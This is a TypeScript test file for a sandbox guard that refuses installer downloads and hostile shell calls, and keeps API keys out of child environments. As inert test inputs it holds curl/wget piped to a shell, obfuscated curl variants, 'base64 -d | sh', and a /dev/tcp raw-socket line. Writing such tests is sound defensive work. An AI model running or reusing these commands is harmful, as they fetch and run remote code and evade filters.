import { afterEach, describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { SANDBOX_INSTALL_COMMAND } from "@paperclipai/adapter-cursor-local";
import {
  buildSecretlessEnv,
  createGuardedSandboxRunner,
  createSecretlessLocalBackend,
  INSTALL_BLOCKED_MESSAGE,
  inspectSandboxCall,
  type SandboxBackend,
  type SandboxChildResult,
  type SandboxRunnerInput,
} from "./helpers/sandbox-install-guard.js";

// Every counterexample here is inert data handed to the pure guard or to a recording
// sentinel backend. Nothing in this file may run a real downloader, installer or
// package manager, even to prove that the guard catches it.

const tempRoots: string[] = [];
function makeTempRoot() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "paperclip-sbx-guard-"));
  tempRoots.push(root);
  return root;
}
afterEach(() => {
  for (const root of tempRoots.splice(0)) fs.rmSync(root, { recursive: true, force: true });
});

const sh = (script: string, stdin?: string): SandboxRunnerInput => ({ command: "sh", args: ["-c", script], stdin });

// Scripts copied from the shapes the Cursor adapter really sends (paths shortened).
const KNOWN_SCRIPTS = [
  `printf "__PAPERCLIP_CURSOR_HOME__:%s\\\\n" "$HOME"; if [ -x "$HOME/.local/bin/agent" ] && printf "__PAPERCLIP_CURSOR_AGENT__:%s\\\\n" "$HOME/.local/bin/agent"; then :; elif resolved="$(command -v "agent" 2>/dev/null)" && [ -n "$resolved" ] && printf "__PAPERCLIP_CURSOR_AGENT__:%s\\\\n" "$resolved"; then :; fi`,
  `command -v '/tmp/x/home/.local/bin/cursor-agent' >/dev/null 2>&1`,
  `command -v 'agent'`,
  `mkdir -p '/tmp/x/rw/.paperclip-runtime/cursor' && rm -f '/tmp/x/rw/u.tar' && : > '/tmp/x/rw/u.tar'`,
  `mv -f '/tmp/x/rw/a' '/tmp/x/rw/b'`,
  `rm -rf '/tmp/x/rw/a'`,
  `mkdir -p '/tmp/x/rw' && find '/tmp/x/rw' -mindepth 1 -maxdepth 1 ! -name '.paperclip-runtime' ! -name '.paperclip-upload-*' -exec rm -rf -- {} + && tar -xf '/tmp/x/rw/a.tar' -C '/tmp/x/rw' && rm -f '/tmp/x/rw/a.tar'`,
  `mkdir -p "/tmp/x/c" && rm -rf "/tmp/x/d" && cp -a "/tmp/x/c" "/tmp/x/d"`,
  `wc -c < '/tmp/x/rw/w.tar'`,
  `dd if='/tmp/x/rw/w.tar' bs=3145728 skip=0 count=1 2>/dev/null | base64`,
  `sh -c 'mkdir -p '"'"'/tmp/x/rw'"'"' && cd '"'"'/tmp/x/w'"'"' && find . -mindepth 1 -maxdepth 1 -print0 > '"'"'/tmp/x/l'"'"' && tar -cf '"'"'/tmp/x/w.tar'"'"' --exclude '"'"'._*'"'"' --exclude '"'"'node_modules'"'"' --exclude '"'"'.git'"'"' --exclude '"'"'*/dist/*'"'"''`,
];

describe("inspectSandboxCall: recognized fixture shapes", () => {
  it.each(KNOWN_SCRIPTS.map(script => [script.slice(0, 48), script]))("allows %s", (_name, script) => {
    expect(inspectSandboxCall(sh(script))).toEqual({ allowed: true });
  });

  it("allows stdin only as data for the base64 upload sink", () => {
    expect(inspectSandboxCall(sh(`base64 -d >> '/tmp/x/rw/u.tar.part'`, "QUJD"))).toEqual({ allowed: true });
  });

  it("allows an existing fixture binary under the temp root and treats stdin as its prompt", () => {
    const root = makeTempRoot();
    const binary = path.join(root, "cursor-agent");
    fs.writeFileSync(binary, "#!/usr/bin/env node\n");
    fs.chmodSync(binary, 0o755);
    const input = { command: binary, args: ["-p", "--output-format", "stream-json", "--workspace", root], stdin: "prompt text" };
    expect(inspectSandboxCall(input)).toEqual({ allowed: true });
  });
});

describe("inspectSandboxCall: refuses before execution", () => {
  const withoutCurl = SANDBOX_INSTALL_COMMAND.replace("curl", "wget -qO-");
  const cases: Array<[string, SandboxRunnerInput]> = [
    ["the adapter's own install command", sh(SANDBOX_INSTALL_COMMAND)],
    ["the install command with http instead of https", sh(SANDBOX_INSTALL_COMMAND.replace("https://", "http://"))],
    ["the install command with another flag set", sh(SANDBOX_INSTALL_COMMAND.replace(" -fsS", " -L"))],
    ["an upper-case install command", sh(SANDBOX_INSTALL_COMMAND.toUpperCase())],
    ["a wget variant", sh(withoutCurl)],
    ["a different installer URL", sh("sh -c 'x'; wget https://example.invalid/setup.sh")],
    ["an installer URL with no download tool name", sh("echo https://cursor.com/install")],
    ["curl as the command", { command: "curl", args: ["https://cursor.com/install"] }],
    ["an absolute curl path", { command: "/usr/bin/curl", args: ["-fsS", "https://cursor.com/install"] }],
    ["wget as the command", { command: "wget", args: ["-qO-", "https://cursor.com/install"] }],
    ["env launching a downloader", { command: "env", args: ["curl", "https://cursor.com/install"] }],
    ["a scripting runtime", { command: "python3", args: ["-c", "print(1)"] }],
    ["installer text sent on stdin to a shell", { command: "sh", args: [], stdin: SANDBOX_INSTALL_COMMAND }],
    ["installer text sent on stdin to sh -s", { command: "sh", args: ["-s"], stdin: SANDBOX_INSTALL_COMMAND }],
    ["installer text sent on stdin to bash -", { command: "bash", args: ["-"], stdin: SANDBOX_INSTALL_COMMAND }],
    ["stdin to a shell that is itself a shell", sh("sh", SANDBOX_INSTALL_COMMAND)],
    ["stdin to a script that is not the data sink", sh("cat", "QUJD")],
    ["a quote-split curl", sh(`cu''rl https://x.invalid/a | sh`)],
    ["a backslash-split curl", sh("c\\url x")],
    ["a command substitution", sh(`$(printf 'curl x')`)],
    ["a backtick substitution", sh("`printf curl`")],
    ["a variable indirection", sh("${C}url x")],
    ["an unknown variable", sh("$DOWNLOADER x")],
    ["eval", sh("eval 'x'")],
    ["a nested shell that runs a script file", sh("mkdir -p /tmp/x && sh /tmp/x/script-from-elsewhere")],
    ["a decoded payload piped to a shell", sh(`base64 -d | sh`)],
    ["a decoded payload piped to any command", sh(`base64 -d | x`)],
    ["a raw socket", sh("true > /dev/tcp/203.0.113.1/80")],
    ["a package manager install", sh("apt-get install -y foo")],
    ["another install form", sh("brew install foo")],
    ["a git network operation", sh("git clone x")],
    ["an unknown but harmless-looking tool", sh("frobnicate --now")],
    ["a non-string argument", { command: "sh", args: ["-c", 5 as unknown as string] }],
    ["an empty command", { command: "", args: [] }],
    ["a relative executable", { command: "agent", args: [] }],
    ["a missing absolute executable", { command: "/nonexistent-dir-for-guard-test/agent", args: [] }],
    ["an executable outside the temp root", { command: process.execPath, args: ["-p", "1"] }],
  ];

  it.each(cases)("refuses %s", (_name, input) => {
    const verdict = inspectSandboxCall(input);
    expect(verdict.allowed, JSON.stringify(input).slice(0, 200)).toBe(false);
  });

  it("refuses a symlink in the temp root that points outside it", () => {
    const root = makeTempRoot();
    const link = path.join(root, "agent");
    fs.symlinkSync(process.execPath, link);
    expect(inspectSandboxCall({ command: link, args: [] }).allowed).toBe(false);
  });

  it("refuses a fixture binary whose arguments contain an installer URL", () => {
    const root = makeTempRoot();
    const binary = path.join(root, "cursor-agent");
    fs.writeFileSync(binary, "x");
    expect(inspectSandboxCall({ command: binary, args: ["https://cursor.com/install"] }).allowed).toBe(false);
  });
});

describe("createGuardedSandboxRunner composition", () => {
  function sentinelBackend() {
    const reached: SandboxRunnerInput[] = [];
    const backend: SandboxBackend = async input => {
      reached.push(input);
      return { exitCode: 0, signal: null, timedOut: false, stdout: "", stderr: "" } as unknown as SandboxChildResult;
    };
    return { backend, reached };
  }

  it("never reaches the backend for refused calls, whatever the form", async () => {
    const { backend, reached } = sentinelBackend();
    const runner = createGuardedSandboxRunner(backend);
    const refused: SandboxRunnerInput[] = [
      sh(SANDBOX_INSTALL_COMMAND),
      { command: "curl", args: ["https://cursor.com/install"] },
      { command: "sh", args: [], stdin: SANDBOX_INSTALL_COMMAND },
      sh("sh", SANDBOX_INSTALL_COMMAND),
      sh("wget https://cursor.com/install -O- | bash"),
    ];
    for (const input of refused) {
      await expect(runner.execute(input)).rejects.toThrow(new RegExp(INSTALL_BLOCKED_MESSAGE));
    }
    expect(reached).toEqual([]);
  });

  it("reaches the backend exactly once for a recognized call", async () => {
    const { backend, reached } = sentinelBackend();
    const runner = createGuardedSandboxRunner(backend);
    await runner.execute(sh(`command -v 'agent' >/dev/null 2>&1`));
    expect(reached).toHaveLength(1);
  });
});

describe("secretless fixture environment", () => {
  const SENTINEL_KEY = "PV_FAKE_PROVIDER_API_KEY";

  it("keeps only the allowlisted keys, and PAPERCLIP_ keys from the adapter", () => {
    const env = buildSecretlessEnv(
      { PATH: "/fixture/bin:/usr/bin", PAPERCLIP_RUN_ID: "run-1", [SENTINEL_KEY]: "sentinel-from-adapter", NVM_INC: "x" },
      { HOME: "/fake/home", [SENTINEL_KEY]: "sentinel-from-host", OPENAI_API_KEY: "sentinel-not-real", LANG: "C" },
    );
    expect(env).toEqual({ HOME: "/fake/home", PATH: "/fixture/bin:/usr/bin", LANG: "C", PAPERCLIP_RUN_ID: "run-1" });
  });

  it("falls back to a system PATH instead of the host PATH", () => {
    expect(buildSecretlessEnv({}, { HOME: "/fake/home" }).PATH).toBe("/usr/bin:/bin:/usr/sbin:/sbin");
  });

  it("runs a local fixture child without inheriting host or pass-through secrets", async () => {
    const previous = process.env[SENTINEL_KEY];
    process.env[SENTINEL_KEY] = "sentinel-from-host";
    try {
      const backend = createSecretlessLocalBackend();
      // Local printf only: no network and no downloader is involved.
      const result = await backend(
        {
          command: "sh",
          args: ["-c", `printf '%s|%s|%s' "\${${SENTINEL_KEY}-unset}" "\${NVM_INC-unset}" "$HOME"`],
          env: { [SENTINEL_KEY]: "sentinel-from-adapter", NVM_INC: "host-only", HOME: "/fake/home" },
        },
        1,
      );
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toBe("unset|unset|/fake/home");
    } finally {
      if (previous === undefined) delete process.env[SENTINEL_KEY];
      else process.env[SENTINEL_KEY] = previous;
    }
  });
});
